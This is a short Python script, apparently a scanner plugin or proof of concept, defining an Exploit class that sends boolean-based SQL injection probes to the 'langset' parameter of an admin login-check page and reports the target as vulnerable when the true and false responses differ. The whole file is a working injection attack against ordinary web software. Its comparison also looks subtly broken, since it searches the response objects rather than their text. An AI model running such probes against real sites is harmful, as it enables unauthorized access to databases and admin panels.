# coding:utf-8
import requests
import urllib2

class Exploit:

    def attack(self, url):
        true_url = url + "/admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='1")
        false_url = url + "/admin/login/login_check.php?langset=cn" + urllib2.quote("' and '1' ='2")

        response = requests.get(true_url)
        response2 = requests.get(false_url)

        if 'not have this language' in response2 and 'not have this language' not in response:
            return true_url